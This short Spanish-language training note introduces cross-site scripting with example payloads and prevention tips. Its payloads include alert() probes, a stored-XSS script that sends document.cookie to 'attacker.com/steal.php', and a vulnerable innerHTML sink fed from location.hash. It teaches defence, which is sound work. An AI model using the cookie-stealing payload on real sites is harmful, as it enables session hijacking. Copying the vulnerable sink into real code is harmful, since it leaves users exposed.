
# Cross-Site Scripting (XSS) - Fundamentos

## 🎯 Objetivo
Comprender y practicar la identificación y explotación de vulnerabilidades XSS.

## 📚 Tipos de XSS

### 1. Reflected XSS
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
```

### 2. Stored XSS
```html
<script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
```

### 3. DOM-based XSS
```javascript
document.getElementById('output').innerHTML = location.hash.substring(1);
```

## 🧪 Práctica
1. Ejecuta `xss_trainer.py`
2. Prueba diferentes payloads
3. Analiza el contexto de inyección
4. Practica bypass de filtros

## 🛡️ Prevención
- Escapar outputs
- Content Security Policy (CSP)
- Validación de inputs
- HTTPOnly cookies
